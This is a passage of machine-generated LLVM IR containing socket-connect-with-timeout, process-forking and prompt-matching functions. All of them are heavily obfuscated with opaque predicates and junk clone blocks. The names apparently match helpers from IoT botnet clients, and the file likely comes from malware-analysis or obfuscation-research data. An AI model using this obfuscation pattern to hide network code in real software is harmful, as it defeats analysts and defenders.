originalBB61:                                     ; preds = %originalBB61alteredBB, %234
  %243 = load i32, i32* %18, align 4
  %244 = add nsw i32 %243, 1
  store i32 %244, i32* %18, align 4
  %245 = load i32, i32* @x.47
  %246 = load i32, i32* @y.48
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart266, label %originalBB61alteredBB

originalBBpart266:                                ; preds = %originalBB61
  br label %152

; <label>:253:                                    ; preds = %originalBBpart259, %originalBBpart247
  %254 = load i8*, i8** %17, align 8
  store i8 0, i8* %254, align 1
  %255 = load i32, i32* %18, align 4
  store i32 %255, i32* %4, align 4
  br label %256

; <label>:256:                                    ; preds = %253, %originalBBpart251
  %257 = load i32, i32* %4, align 4
  ret i32 %257

originalBBalteredBB:                              ; preds = %originalBB, %33
  %258 = load i32, i32* %5, align 4
  %_ = shl i32 %258, 64
  %259 = srem i32 %258, 64
  %260 = zext i32 %259 to i64
  %_1 = shl i64 1, %260
  %_2 = sub i64 1, %260
  %gen = mul i64 %_2, %260
  %_3 = shl i64 1, %260
  %_4 = sub i64 0, 1
  %gen5 = add i64 %_4, %260
  %_6 = shl i64 1, %260
  %_7 = sub i64 0, 1
  %gen8 = add i64 %_7, %260
  %261 = shl i64 1, %260
  %262 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %263 = load i32, i32* %5, align 4
  %_9 = sub i32 %263, 64
  %gen10 = mul i32 %_9, 64
  %264 = sdiv i32 %263, 64
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds [16 x i64], [16 x i64]* %262, i64 0, i64 %265
  %267 = load i64, i64* %266, align 8
  %_11 = sub i64 %267, %261
  %gen12 = mul i64 %_11, %261
  %_13 = sub i64 0, %267
  %gen14 = add i64 %_13, %261
  %268 = or i64 %267, %261
  store i64 %268, i64* %266, align 8
  %269 = load i32, i32* %5, align 4
  %_15 = shl i32 %269, 1
  %_16 = sub i32 %269, 1
  %gen17 = mul i32 %_16, 1
  %_18 = shl i32 %269, 1
  %_19 = sub i32 0, %269
  %gen20 = add i32 %_19, 1
  %_21 = sub i32 0, %269
  %gen22 = add i32 %_21, 1
  %_23 = sub i32 0, %269
  %gen24 = add i32 %_23, 1
  %270 = add nsw i32 %269, 1
  %271 = call i32 @select(i32 %270, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %271, i32* %12, align 4
  %272 = icmp sle i32 %271, 0
  br label %originalBB

originalBB25alteredBB:                            ; preds = %originalBB25, %65
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %85
  %273 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %273, align 8
  %274 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %274, align 8
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %129
  %275 = load i32, i32* %13, align 4
  %_34 = sub i32 0, %275
  %gen35 = add i32 %_34, 1
  %276 = add nsw i32 %275, 1
  store i32 %276, i32* %13, align 4
  br label %originalBB33

originalBB39alteredBB:                            ; preds = %originalBB39, %152
  %277 = load i32, i32* %7, align 4
  %_40 = sub i32 0, %277
  %gen41 = add i32 %_40, -1
  %_42 = sub i32 0, %277
  %gen43 = add i32 %_42, -1
  %_44 = sub i32 0, %277
  %gen45 = add i32 %_44, -1
  %278 = add nsw i32 %277, -1
  store i32 %278, i32* %7, align 4
  %279 = icmp sgt i32 %277, 1
  br label %originalBB39

originalBB49alteredBB:                            ; preds = %originalBB49, %176
  %280 = load i8*, i8** %17, align 8
  store i8 0, i8* %280, align 1
  store i32 -1, i32* %4, align 4
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %194
  %281 = load i8, i8* %16, align 1
  %282 = load i8*, i8** %17, align 8
  %283 = getelementptr inbounds i8, i8* %282, i32 1
  store i8* %283, i8** %17, align 8
  store i8 %281, i8* %282, align 1
  %284 = load i8, i8* %16, align 1
  %285 = zext i8 %284 to i32
  %286 = icmp eq i32 %285, 10
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %217
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %234
  %287 = load i32, i32* %18, align 4
  %_62 = sub i32 %287, 1
  %gen63 = mul i32 %_62, 1
  %_64 = shl i32 %287, 1
  %288 = add nsw i32 %287, 1
  store i32 %288, i32* %18, align 4
  br label %originalBB61
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %164

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %155

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #10
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %121

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #5, !srcloc !4
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* @x.49
  %65 = load i32, i32* @y.50
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %63
  %72 = load i32, i32* %6, align 4
  %73 = srem i32 %72, 64
  %74 = zext i32 %73 to i64
  %75 = shl i64 1, %74
  %76 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %77 = load i32, i32* %6, align 4
  %78 = sdiv i32 %77, 64
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds [16 x i64], [16 x i64]* %76, i64 0, i64 %79
  %81 = load i64, i64* %80, align 8
  %82 = or i64 %81, %75
  store i64 %82, i64* %80, align 8
  %83 = load i32, i32* %6, align 4
  %84 = add nsw i32 %83, 1
  %85 = call i32 @select(i32 %84, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %86 = icmp sgt i32 %85, 0
  %87 = load i32, i32* @x.49
  %88 = load i32, i32* @y.50
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %86, label %95, label %119

; <label>:95:                                     ; preds = %originalBBpart2
  store i32 4, i32* %13, align 4
  %96 = load i32, i32* %6, align 4
  %97 = bitcast i32* %14 to i8*
  %98 = call i32 @getsockopt(i32 %96, i32 1, i32 4, i8* %97, i32* %13) #5
  %99 = load i32, i32* %14, align 4
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %101, label %102

; <label>:101:                                    ; preds = %95
  store i32 0, i32* %5, align 4
  br label %164

; <label>:102:                                    ; preds = %95
  %103 = load i32, i32* @x.49
  %104 = load i32, i32* @y.50
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %102
  %111 = load i32, i32* @x.49
  %112 = load i32, i32* @y.50
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %120

; <label>:119:                                    ; preds = %originalBBpart2
  store i32 0, i32* %5, align 4
  br label %164

; <label>:120:                                    ; preds = %originalBBpart221
  br label %138

; <label>:121:                                    ; preds = %45
  %122 = load i32, i32* @x.49
  %123 = load i32, i32* @y.50
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %121
  store i32 0, i32* %5, align 4
  %130 = load i32, i32* @x.49
  %131 = load i32, i32* @y.50
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %164

; <label>:138:                                    ; preds = %120
  %139 = load i32, i32* @x.49
  %140 = load i32, i32* @y.50
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %138
  %147 = load i32, i32* @x.49
  %148 = load i32, i32* @y.50
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %155

; <label>:155:                                    ; preds = %originalBBpart229, %37
  %156 = load i32, i32* %6, align 4
  %157 = call i32 (i32, i32, ...) @fcntl(i32 %156, i32 3, i8* null)
  %158 = sext i32 %157 to i64
  store i64 %158, i64* %15, align 8
  %159 = load i64, i64* %15, align 8
  %160 = and i64 %159, -2049
  store i64 %160, i64* %15, align 8
  %161 = load i32, i32* %6, align 4
  %162 = load i64, i64* %15, align 8
  %163 = call i32 (i32, i32, ...) @fcntl(i32 %161, i32 4, i64 %162)
  store i32 1, i32* %5, align 4
  br label %164

; <label>:164:                                    ; preds = %155, %originalBBpart225, %119, %101, %36
  %165 = load i32, i32* @x.49
  %166 = load i32, i32* @y.50
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %164
  %173 = load i32, i32* %5, align 4
  %174 = load i32, i32* @x.49
  %175 = load i32, i32* @y.50
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  ret i32 %173

originalBBalteredBB:                              ; preds = %originalBB, %63
  %182 = load i32, i32* %6, align 4
  %183 = srem i32 %182, 64
  %184 = zext i32 %183 to i64
  %185 = shl i64 1, %184
  %186 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %187 = load i32, i32* %6, align 4
  %_ = sub i32 %187, 64
  %gen = mul i32 %_, 64
  %_1 = shl i32 %187, 64
  %_2 = sub i32 0, %187
  %gen3 = add i32 %_2, 64
  %_4 = sub i32 0, %187
  %gen5 = add i32 %_4, 64
  %_6 = sub i32 %187, 64
  %gen7 = mul i32 %_6, 64
  %188 = sdiv i32 %187, 64
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds [16 x i64], [16 x i64]* %186, i64 0, i64 %189
  %191 = load i64, i64* %190, align 8
  %_8 = sub i64 0, %191
  %gen9 = add i64 %_8, %185
  %_10 = shl i64 %191, %185
  %_11 = sub i64 0, %191
  %gen12 = add i64 %_11, %185
  %_13 = shl i64 %191, %185
  %192 = or i64 %191, %185
  store i64 %192, i64* %190, align 8
  %193 = load i32, i32* %6, align 4
  %_14 = shl i32 %193, 1
  %_15 = sub i32 0, %193
  %gen16 = add i32 %_15, 1
  %_17 = sub i32 %193, 1
  %gen18 = mul i32 %_17, 1
  %194 = add nsw i32 %193, 1
  %195 = call i32 @select(i32 %194, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %196 = icmp sgt i32 %195, 0
  br label %originalBB

originalBB19alteredBB:                            ; preds = %originalBB19, %102
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %121
  store i32 0, i32* %5, align 4
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %138
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %164
  %197 = load i32, i32* %5, align 4
  br label %originalBB31
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %63

; <label>:10:                                     ; preds = %0
  %11 = load i32, i32* @x.51
  %12 = load i32, i32* @y.52
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i64, i64* @numpids, align 8
  %20 = add i64 %19, 1
  store i64 %20, i64* @numpids, align 8
  %21 = load i64, i64* @numpids, align 8
  %22 = add i64 %21, 1
  %23 = mul i64 %22, 4
  %24 = call noalias i8* @malloc(i64 %23) #5
  %25 = bitcast i8* %24 to i32*
  store i32* %25, i32** %3, align 8
  store i32 0, i32* %4, align 4
  %26 = load i32, i32* @x.51
  %27 = load i32, i32* @y.52
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %50, %originalBBpart2
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = load i64, i64* @numpids, align 8
  %38 = sub i64 %37, 1
  %39 = icmp ult i64 %36, %38
  br i1 %39, label %40, label %53

; <label>:40:                                     ; preds = %34
  %41 = load i32*, i32** @pids, align 8
  %42 = load i32, i32* %4, align 4
  %43 = zext i32 %42 to i64
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  %45 = load i32, i32* %44, align 4
  %46 = load i32*, i32** %3, align 8
  %47 = load i32, i32* %4, align 4
  %48 = zext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 %45, i32* %49, align 4
  br label %50

; <label>:50:                                     ; preds = %40
  %51 = load i32, i32* %4, align 4
  %52 = add i32 %51, 1
  store i32 %52, i32* %4, align 4
  br label %34

; <label>:53:                                     ; preds = %34
  %54 = load i32, i32* %2, align 4
  %55 = load i32*, i32** %3, align 8
  %56 = load i64, i64* @numpids, align 8
  %57 = sub i64 %56, 1
  %58 = getelementptr inbounds i32, i32* %55, i64 %57
  store i32 %54, i32* %58, align 4
  %59 = load i32*, i32** @pids, align 8
  %60 = bitcast i32* %59 to i8*
  call void @free(i8* %60) #5
  %61 = load i32*, i32** %3, align 8
  store i32* %61, i32** @pids, align 8
  %62 = load i32, i32* %2, align 4
  store i32 %62, i32* %1, align 4
  br label %63

; <label>:63:                                     ; preds = %53, %8
  %64 = load i32, i32* %1, align 4
  ret i32 %64

originalBBalteredBB:                              ; preds = %originalBB, %10
  %65 = load i64, i64* @numpids, align 8
  %_ = shl i64 %65, 1
  %_1 = shl i64 %65, 1
  %66 = add i64 %65, 1
  store i64 %66, i64* @numpids, align 8
  %67 = load i64, i64* @numpids, align 8
  %_2 = sub i64 0, %67
  %gen = add i64 %_2, 1
  %_3 = sub i64 %67, 1
  %gen4 = mul i64 %_3, 1
  %_5 = sub i64 0, %67
  %gen6 = add i64 %_5, 1
  %_7 = sub i64 0, %67
  %gen8 = add i64 %_7, 1
  %68 = add i64 %67, 1
  %_9 = sub i64 0, %68
  %gen10 = add i64 %_9, 4
  %_11 = shl i64 %68, 4
  %_12 = shl i64 %68, 4
  %69 = mul i64 %68, 4
  %70 = call noalias i8* @malloc(i64 %69) #5
  %71 = bitcast i8* %70 to i32*
  store i32* %71, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.472, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %145, %1
  %12 = load i32, i32* @x.53
  %13 = load i32, i32* @y.54
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i32, i32* %6, align 4
  %21 = sext i32 %20 to i64
  %22 = load i8*, i8** %4, align 8
  %23 = call i64 @strlen(i8* %22) #9
  %24 = icmp ult i64 %21, %23
  %25 = load i32, i32* @x.53
  %26 = load i32, i32* @y.54
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %148

; <label>:33:                                     ; preds = %originalBBpart2
  br label %34

; <label>:34:                                     ; preds = %106, %33
  %35 = load i32, i32* %5, align 4
  %36 = load i32, i32* %7, align 4
  %37 = icmp sgt i32 %35, %36
  br i1 %37, label %38, label %104

; <label>:38:                                     ; preds = %34
  %39 = load i8*, i8** %3, align 8
  %40 = load i32, i32* %5, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = sub i64 0, %44
  %46 = getelementptr inbounds i8, i8* %42, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp eq i32 %48, 0
  br i1 %49, label %86, label %50

; <label>:50:                                     ; preds = %38
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 32
  br i1 %61, label %86, label %62

; <label>:62:                                     ; preds = %50
  %63 = load i8*, i8** %3, align 8
  %64 = load i32, i32* %5, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i32, i32* %7, align 4
  %68 = sext i32 %67 to i64
  %69 = sub i64 0, %68
  %70 = getelementptr inbounds i8, i8* %66, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp eq i32 %72, 13
  br i1 %73, label %86, label %74

; <label>:74:                                     ; preds = %62
  %75 = load i8*, i8** %3, align 8
  %76 = load i32, i32* %5, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i32, i32* %7, align 4
  %80 = sext i32 %79 to i64
  %81 = sub i64 0, %80
  %82 = getelementptr inbounds i8, i8* %78, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = icmp eq i32 %84, 10
  br label %86

; <label>:86:                                     ; preds = %74, %62, %50, %38
  %87 = phi i1 [ true, %62 ], [ true, %50 ], [ true, %38 ], [ %85, %74 ]
  %88 = load i32, i32* @x.53
  %89 = load i32, i32* @y.54
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %86
  %96 = load i32, i32* @x.53
  %97 = load i32, i32* @y.54
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %104

; <label>:104:                                    ; preds = %originalBBpart24, %34
  %105 = phi i1 [ false, %34 ], [ %87, %originalBBpart24 ]
  br i1 %105, label %106, label %109

; <label>:106:                                    ; preds = %104
  %107 = load i32, i32* %7, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %7, align 4
  br label %34

; <label>:109:                                    ; preds = %104
  %110 = load i32, i32* @x.53
  %111 = load i32, i32* @y.54
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %109
  %118 = load i8*, i8** %3, align 8
  %119 = load i32, i32* %5, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = load i32, i32* %7, align 4
  %123 = sext i32 %122 to i64
  %124 = sub i64 0, %123
  %125 = getelementptr inbounds i8, i8* %121, i64 %124
  %126 = load i8, i8* %125, align 1
  %127 = sext i8 %126 to i32
  %128 = load i8*, i8** %4, align 8
  %129 = load i32, i32* %6, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = icmp eq i32 %127, %133
  %135 = load i32, i32* @x.53
  %136 = load i32, i32* @y.54
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart217, label %originalBB6alteredBB

originalBBpart217:                                ; preds = %originalBB6
  br i1 %134, label %143, label %144

; <label>:143:                                    ; preds = %originalBBpart217
  store i32 1, i32* %2, align 4
  br label %165

; <label>:144:                                    ; preds = %originalBBpart217
  br label %145

; <label>:145:                                    ; preds = %144
  %146 = load i32, i32* %6, align 4
  %147 = add nsw i32 %146, 1
  store i32 %147, i32* %6, align 4
  br label %11

; <label>:148:                                    ; preds = %originalBBpart2
  %149 = load i32, i32* @x.53
  %150 = load i32, i32* @y.54
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %148
  store i32 0, i32* %2, align 4
  %157 = load i32, i32* @x.53
  %158 = load i32, i32* @y.54
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %165

; <label>:165:                                    ; preds = %originalBBpart221, %143
  %166 = load i32, i32* %2, align 4
  ret i32 %166

originalBBalteredBB:                              ; preds = %originalBB, %11
  %167 = load i32, i32* %6, align 4
  %168 = sext i32 %167 to i64
  %169 = load i8*, i8** %4, align 8
  %170 = call i64 @strlen(i8* %169) #9
  %171 = icmp ult i64 %168, %170
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %86
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %109
  %172 = load i8*, i8** %3, align 8
  %173 = load i32, i32* %5, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds i8, i8* %172, i64 %174
  %176 = load i32, i32* %7, align 4
  %177 = sext i32 %176 to i64
  %_ = shl i64 0, %177
  %_7 = sub i64 0, %177
  %gen = mul i64 %_7, %177
  %_8 = sub i64 0, 0
  %gen9 = add i64 %_8, %177
  %_10 = sub i64 0, 0
  %gen11 = add i64 %_10, %177
  %_12 = sub i64 0, 0
  %gen13 = add i64 %_12, %177
  %_14 = sub i64 0, 0
  %gen15 = add i64 %_14, %177
